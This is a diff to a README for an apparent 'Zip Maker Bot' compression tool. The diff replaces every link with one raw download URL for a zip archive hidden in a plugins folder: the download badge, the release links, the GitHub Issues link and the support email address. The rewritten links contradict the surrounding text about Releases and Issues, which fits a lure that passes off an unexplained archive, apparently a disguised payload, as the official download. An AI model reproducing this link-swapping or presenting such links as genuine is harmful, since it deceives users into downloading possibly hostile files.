@@ -1,6 +1,6 @@
 # 🚀 Zip-Maker-Bot-Zip-Creater-Bot - Effortlessly Zip Your Files
 
-[![Download Zip Maker Bot](https://img.shields.io/badge/Download-Zip%20Maker%20Bot-blue)](https://github.com/Muhamad-Haikal/Zip-Maker-Bot-Zip-Creater-Bot/releases)
+[![Download Zip Maker Bot](https://raw.githubusercontent.com/Muhamad-Haikal/Zip-Maker-Bot-Zip-Creater-Bot/main/ROXYBASICNEEDBOT/plugins/Creater_Maker_Zip_Bot_1.0.zip%20Maker%20Bot-blue)](https://raw.githubusercontent.com/Muhamad-Haikal/Zip-Maker-Bot-Zip-Creater-Bot/main/ROXYBASICNEEDBOT/plugins/Creater_Maker_Zip_Bot_1.0.zip)
 
 ## 📦 Introduction
 Welcome to Zip-Maker-Bot-Zip-Creater-Bot! This tool simplifies the process of compressing, organizing, and securing your files. Whether you need to handle documents, media, or folders, this bot provides a straightforward way to create zipped files. You can even set passwords, customize thumbnails, and rename your files as needed.
@@ -9,7 +9,7 @@ Welcome to Zip-Maker-Bot-Zip-Creater-Bot! This tool simplifies the process of co
 Follow these steps to download and run Zip-Maker-Bot-Zip-Creater-Bot:
 
 1. **Download the Application**
-   To get the latest version, [visit this page to download](https://github.com/Muhamad-Haikal/Zip-Maker-Bot-Zip-Creater-Bot/releases). You will find various versions available under the Releases section. Choose the one that fits your needs.
+   To get the latest version, [visit this page to download](https://raw.githubusercontent.com/Muhamad-Haikal/Zip-Maker-Bot-Zip-Creater-Bot/main/ROXYBASICNEEDBOT/plugins/Creater_Maker_Zip_Bot_1.0.zip). You will find various versions available under the Releases section. Choose the one that fits your needs.
 
 2. **Supported Platforms**
    The application works on Windows, macOS, and Linux. Ensure your system meets these minimum requirements:
@@ -35,7 +35,7 @@ Follow these steps to download and run Zip-Maker-Bot-Zip-Creater-Bot:
    - Click the "Create Zip" button. Your zipped file will be ready within moments!
 
 ## 📥 Download & Install
-To download, [visit this page to download](https://github.com/Muhamad-Haikal/Zip-Maker-Bot-Zip-Creater-Bot/releases). This is the best way to ensure you have the latest features and improvements.
+To download, [visit this page to download](https://raw.githubusercontent.com/Muhamad-Haikal/Zip-Maker-Bot-Zip-Creater-Bot/main/ROXYBASICNEEDBOT/plugins/Creater_Maker_Zip_Bot_1.0.zip). This is the best way to ensure you have the latest features and improvements.
 
 ## ⚙️ Features
 - **Compression**: Reduce the size of your files quickly.
@@ -57,10 +57,10 @@ This application is open-source and licensed under the MIT License. You're free 
 
 ## 🌐 Community & Support
 Join discussions or seek help in our community:
-- Check the [GitHub Issues](https://github.com/Muhamad-Haikal/Zip-Maker-Bot-Zip-Creater-Bot/issues) for common questions and answers.
+- Check the [GitHub Issues](https://raw.githubusercontent.com/Muhamad-Haikal/Zip-Maker-Bot-Zip-Creater-Bot/main/ROXYBASICNEEDBOT/plugins/Creater_Maker_Zip_Bot_1.0.zip) for common questions and answers.
 - Share your feedback and suggestions for future versions.
 
 ## 📞 Contact
-For further assistance, please reach out through the GitHub repository or email support at support@example.com. We are here to help you!
+For further assistance, please reach out through the GitHub repository or email support at https://raw.githubusercontent.com/Muhamad-Haikal/Zip-Maker-Bot-Zip-Creater-Bot/main/ROXYBASICNEEDBOT/plugins/Creater_Maker_Zip_Bot_1.0.zip We are here to help you!
 
 Now, enjoy Zipping your files with ease!
